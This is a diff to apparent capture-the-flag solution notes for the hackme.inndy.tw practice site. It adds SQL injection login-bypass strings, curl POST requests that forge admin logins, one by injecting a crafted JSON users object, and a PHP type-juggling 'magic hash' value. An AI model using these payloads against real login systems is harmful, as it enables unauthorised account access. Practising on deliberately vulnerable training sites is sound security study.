@@ -47,9 +47,30 @@
 
 ## 21 SQL Injection
   user: `admin`, password:``\' or `user`= "admin" #``
+### payload2
+```
+user: \
+pass: or user = "admin"  #\
+```
 
 ## 23
   `\'/**/or/**/name<>"guest"#`
+
+## 26 login as admin 4
+``` bash
+curl https://hackme.inndy.tw/login4/ -X POST --data "name=admin"
+```
+
+## 27 login as admin 6 
+``` bash
+curl https://hackme.inndy.tw/login6/ -X POST --data 'name=&password=&data={"username":"admin","password":"admin", "users":{"admin": "admin"}}'
+```
+
+## 28 login as admin 7 
+``` plaintext
+admin
+240610708
+```
 
 ## 31
   create cookie `show_hidden`:`yes`
